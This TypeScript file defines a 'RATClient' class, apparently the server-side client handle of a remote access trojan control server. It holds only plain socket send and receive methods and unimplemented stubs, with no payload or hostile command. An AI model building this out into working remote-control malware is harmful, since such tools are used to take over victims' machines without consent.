import { Socket } from "net";
import IRATClient from "../interfaces/IRATClient";
import RATServer from "./RATServer";

export default class RATClient implements IRATClient {
    connected: boolean;
    ratServer: RATServer;
    socket: Socket;
    uuid: string;

    constructor(socket: Socket, ratServer: RATServer) {
        this.connected = false;
        this.ratServer = ratServer;
        this.socket = socket;
        this.uuid = '';
        // check for uuid, if no uuid, gives him one
    }
    send(data: string): void {
        this.socket.write(data, (error) => {
            if (error) {
                console.error(`Error sending data: ${error}`);
            }
        });
    }
    async receive(): Promise<any> {
        try {
            // Read data from the socket
            let data = await new Promise<string>((resolve, reject) => {
                this.socket.on('data', (chunk: Buffer) => {
                    resolve(chunk.toString());
                });
                this.socket.on('error', (error: Error) => {
                    reject(error);
                });
            });
            // Process the received data
            return data;
        } catch (error) {
            console.error(`Error reading data from socket: ${error}`);
        }
    }
    isConnected(): boolean {
        throw new Error("Method not implemented.");
    }
    
}